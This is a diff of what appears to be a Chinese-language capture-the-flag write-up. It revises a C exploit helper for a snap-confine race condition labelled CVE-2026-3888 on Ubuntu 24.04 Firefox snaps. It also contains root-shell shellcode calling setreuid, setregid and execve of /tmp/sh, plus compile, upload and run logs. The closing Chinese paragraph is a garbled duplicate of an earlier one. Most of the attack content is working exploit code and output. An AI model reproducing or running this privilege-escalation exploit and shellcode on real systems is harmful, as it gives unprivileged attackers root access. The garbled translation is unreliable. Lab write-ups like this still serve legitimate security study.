@@ -455,7 +455,7 @@ drwxr-xr-x 21 root root  540 Apr  8 09:05 ..
 #### 使用 --base snapd（无效）会删除缓存的挂载命名空间，但会保留 /tmp 目录。systemd-run 包装器满足了 snap 的 cgroup 要求。出现这个错误是意料之中的，因为失败行为正是导致命名空间被破坏的原因。
 #### 我们对本文末尾所包含的辅助程序和附加文件进行了编译和上传。该辅助程序会重新创建 .snap（由攻击者控制的文件），将 285 个真实的库复制到 .exchange 文件夹中，启动 snapconfine 并通过一个小型套接字限制调试输出，检测绑定挂载触发器，并通过 renameat2(RENAME_EXCHANGE) 原子性地交换目录。snap-confine 会恢复运行并以 root 身份绑定挂载我们的文件。我们需要保持这个终端窗口打开，以使进程保持运行状态，从而保持我们被污染的命名空间的运行状态。
 ```
-[★]$ cat firefox_2024.c
+[★]$ vi firefox_2404.c
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -490,6 +490,8 @@ static int copy_file(const char *src, const char *dst) {
 		close(fdd);
 		return 0;
 }
+
+
 static int setup_snap_and_exchange(const char *payload_so) {
 		mkdir(".snap", 0755);
 		mkdir(".snap/usr", 0755);
@@ -501,27 +503,28 @@ static int setup_snap_and_exchange(const char *payload_so) {
 		if (d) {
 				struct dirent *ent;
 				while ((ent = readdir(d)) != NULL) {
-						if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {
-								char p[512];
-								snaprint(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);
-								mkdir(p, 0755);
-								snaprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);
-								mkdir(p, 0755);
-						}
+								if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {
+										char p[512];
+										snprintf(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);
+										mkdir(p, 0755);
+										snprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);
+										mkdir(p, 0755);
+								}
 				}
 				closedir(d);
 		}
+
 		mkdir(EXCHANGE_SRC, 0755);
 
-		d = opendir(REAL_LIBDIR);
-		if (!d) { perror("opendir real libdir"); return -1l }
+		d= opendir(REAL_LIBDIR);
+		if (!d) { perror("opendir real libdir"); return -1; }
 
 		int count = 0;
 		struct dirent *ent;
 		while ((ent = readdir(d)) != NULL) {
-				if (ent->d_name[0] == '.' &&
+				if (ent->d_name[0] == '.' && 
 								(ent->d_name[1] == '\0' ||
-				 						(ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
+				 				(ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
 						continue;
 
 				char src[4096], dst[4096];
@@ -530,13 +533,12 @@ static int setup_snap_and_exchange(const char *payload_so) {
 
 				struct stat st;
 				if (lstat(src, &st) < 0) continue;
-
-				if (S_ISDIR(st.st_name)) {
+				if (S_ISDIR(st.st_mode)) {
 						mkdir(dst, 0755);
 				} else if (S_ISLNK(st.st_mode)) {
-					  char liink[4096];
-				    ssize_t len = readlink(src, link, sizeof(link) -1);
-					  if (len >0) { link[len] = '\0'; symlink(link, dst); }
+						char link[4096];
+						ssize_t len = readlink(src, link, sizeof(link) - 1);
+						if (len > 0) { link[len] = '\0'; symlink(link, dst); }
 				} else {
 						copy_file(src, dst);
 				}
@@ -544,11 +546,11 @@ static int setup_snap_and_exchange(const char *payload_so) {
 		}
 		closedir(d);
 
-		printf("[*] Exchange dir ready: %d entries in  %s\n", count EXCHANGE_SRC);
+		printf("[*] Exchange dir ready: %d entries in %s\n", count, EXCHANGE_SRC);
 		return 0;
 }
 
-static int create_stderr_socket(int *read_fdm int *write_fd) {
+static int create_stderr_socket(int *read_fd, int *write_fd) {
 		int sv[2];
 		if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
 				perror("socketpair"); return -1;
@@ -557,7 +559,7 @@ static int create_stderr_socket(int *read_fdm int *write_fd) {
 		setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
 		setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
 		setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
-		setsockopt(sv[1], SOL_SOCKET, SO_SNFBUF, &bufsize, sizeof(bufsize));
+		setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
 		*read_fd = sv[0];
 		*write_fd = sv[1];
 		return 0;
@@ -567,8 +569,8 @@ static int run_and_race(void) {
 		int read_fd, write_fd;
 		if (create_stderr_socket(&read_fd, &write_fd) < 0) return -1;
 
-		pid_t pid= fork();
-		if (pid <0 ) { perror("fork"); return -1; }
+		pid_t pid = fork();
+		if (pid < 0) { perror("fork"); return -1;}
 
 		if (pid ==0) {
 				close(read_fd);
@@ -581,8 +583,8 @@ static int run_and_race(void) {
 								"--base", "core22",
 								"snap.firefox.hook.configure",
 								"/bin/sh", "-c",
-								"echo $$ > /tmp/race_pid.txt;"
-								"star -c '%U:%G %a' /usr/lib/x86_64-linux-gun/ld-linux-x86-64.so.2 "
+								"echo $$ > /tmp/race_pid.txt; "
+								"stat -c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
 								"> /tmp/race_perms.txt 2>&1; "
 								"sleep 99994",
 								NULL);
@@ -599,66 +601,159 @@ static int run_and_race(void) {
 		ssize_t n;
 		int swapped = 0;
 
-		prntf("[*} Reading snap-config output (PID %d)...\n", pid);
+		printf("[*] Reading snap-confine output (PID %d)...\n", pid);
 
-		while ((n = read(read_fd, &byte, 1)) > 0) {
-				write(STDOUT_FILENO, &byte, 1);
+		while ((n = read(read_fd, &byte, 1)) > 0)  {
+						write(STDOUT_FILENO, &byte, 1);
 
-				ringbuf[ringpos %  sizeof(ringbuf)] = byte;
-				ringpos++;
+						ringbuf[ringpos % sizeof(ringbuf)] = byte;
+						ringpos++;
 
-				if (!swapped && ringpos >= tlen) {
+						if(!swapped && ringpos >= tlen) {
 						char check[512];
-						for (int i = 0; i < tlen && i< (int)sizeof(check) -1; i++)
-								check[i] = ringbuf[(ringpos - tlen + i) % sizeof(ringbuf)];
+						for (int i = 0; i < tlen && i < (int)sizeof(check) - 1; i++)
+								check[i] =ringbuf[(ringpos -tlen + i) % sizeof(ringbuf)];
 						check[tlen] = '\0';
 
 						if (strstr(check, TRIGGER)) {
 								printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");
 
-								if (syscall(SYS_renameat2, AT_FDCWD, EXCHANGE) == 0) {
+
+								if (syscall (SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
+												AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0){
 										/* atomic swap succeeded */
 								} else {
-									   rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gun.orig");
-									   rename(EXCHANGE_SRC, EXCHANGE_DST);
+										rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
+										rename(EXCHANGE_SRC, EXCHANGE_DST);
 								}
 
 								swapped = 1;
-								printf("[+] SWAP DONE! Race won.\n");
+								printf("[*] SWAP DONE! Race won.\n");
 								printf("[*] Do NOT close this terminal.\n");
 						}
-				}
+						}
 		}
+
 
 		close(read_fd);
 		int status;
 		waitpid(pid, &status, 0);
 
 		if (swapped)
-				printf("[+] Race won! Our libraries are in namespace.\n");
+				printf("[*] Race won! Our libraries are in the namespace.\n");
 		else
 				printf("[-] Trigger not detected. Race lost.\n");
 
 		return swapped ? 0 : -1;
 }
 
+
 int main(int argc, char *argv[]) {
-		if (argc <2) {
+		if (argc < 2) {
 				fprintf(stderr, "Usage: %s <payload.so>\n", argv[0]);
 				return 1;
 		}
 		printf("[*] CVE-2026-3888 - firefox 24.04 helper\n");
 		printf("[*] CWD: "); fflush(stdout); system("pwd");
-		printf("[*] Setting up .snap and .exchange directory...\n");
+		printf("[*] Setting up .snap and .exchange directiry...\n");
 		if (setup_snap_and_exchange(argv[1]) < 0) return 1;
-		printf("[*] Starting race against snap-confine...\n");
-		if (run_and_race() < 0) return 1;
-		printf("[*] Done. Re-enter sandbox to exploit.\n");
+		printf("[+] Done. Re-enter sandbox to exploit.\n");
 		return 0;
 }
 ```
+```
+[★]$ gcc -O2 -static -o firefox_2404 firefox_2404.c
+[★]$ file firefox_2404
+firefox_2404: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=ef5e7a78d40cb3c90c41038239ad23833412c353, for GNU/Linux 3.2.0, not stripped
+```
+```
+[★]$ cat librootshell.c
+void _start(void) {
+		/* setreuid(0, 0) */
+		__asm__ volatile (
+						"xor %%rdi, %%rdi\n"
+						"xor %%rsi, %%rsi\n"
+						"mov $0x71, %%rax\n"
+						"syscall\n"
+						::: "rax", "rdi", "rsi"
+					 );
+
+		/* setregid(0, 0) */
+		__asm__ volatile (
+						"xor %%rdi, %%rdi\n"
+						"xor %%rsi, %%rsi\n"
+						"mov $0x72, %%rax\n"
+						"syscall\n"
+						::: "rax", "rdi", "rsi"
+					 );
+
+		/* execve("/tmp/sh", {"/tmp/sh", NULL} ,NULL) */
+		__asm__ volatile(
+						"mov $0x68732f706d742f, %%rax\n"
+						"push %%rax\n"
+						"mov %%rsp, %%rdi\n"
+						"push $0\n"
+						"push %%rdi\n"
+						"mov %%rsp, %%rsi\n"
+						"xor %%rdx, %%rdx\n"
+						"mov $0x3b, %%rax\n"
+						"syscall\n"
+						::: "rax", "rdi", "rsi", "rdx"
+					);
+}
+```
+```
+[★]$ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
+[★]$ mv librootshell.so payload.so
+```
+```
+[★]$ scp firefox_2404 jonathan@10.129.18.95:/home/jonathan/
+The authenticity of host '10.129.18.95 (10.129.18.95)' can't be established.
+ED25519 key fingerprint is SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:1: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.18.95' (ED25519) to the list of known hosts.
+jonathan@10.129.18.95's password: 
+firefox_2404
+
+[★]$ scp payload.so jonathan@10.129.18.95:/home/jonathan/
+jonathan@10.129.18.95's password: 
+payload.so                                           100% 9056   935.2KB/s   00:00    
+```
+```
+jonathan@snapped:~$ ~/firefox_2404 ~/payload.so
+[*] CVE-2026-3888 - firefox 24.04 helper
+[*] CWD: /home/jonathan
+[*] Setting up .snap and .exchange directiry...
+[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
+[+] Done. Re-enter sandbox to exploit.
+
+jonathan@snapped:~$ ls .snap/usr/lib/x86_64-linux-gnu.exchange | head
+audit
+cryptsetup
+e2fsprogs
+engines-3
+gconv
+gio
+glib-2.0
+krb5
+ld-linux-x86-64.so.2
+libacl.so.1
+
+```
+```
+jonathan@snapped:~$ cd /proc/9834/cwd
+jonathan@snapped:/proc/9834/cwd$ ls -la
+total 12
+drwxrwxrwt  4 root root 4096 Apr 10 05:48 .
+drwxr-xr-x 21 root root  540 Apr 10 05:45 ..
+drwxr-xr-x  4 root root 4096 Apr 10 05:45 .snap
+drwxrwxrwt  2 root root 4096 Apr 10 03:26 .X11-unix
+```
 #### Step 4 — Destroy cached namespace 
 #### Step 5 — Win the race 
+#### 我们编译并上传了本文末尾包含的helper和有效负载。Snap（攻击者拥有），复制285个真正的库到。通过一个微小的套接字启动带有调试输出的snap限制，检测绑定挂载触发器，然后通过renameat2（RENAME_EXCHANGE）自动交换目录。快照限制简历和以root用户绑定挂载我们的文件。我们得让这个终端一直开着，这样整个过程才能继续，是什么让我们中毒的命名空间存活
 ----------------------------------------------------------------------
 Terminal 3
 ----------------------------------------------------------------------
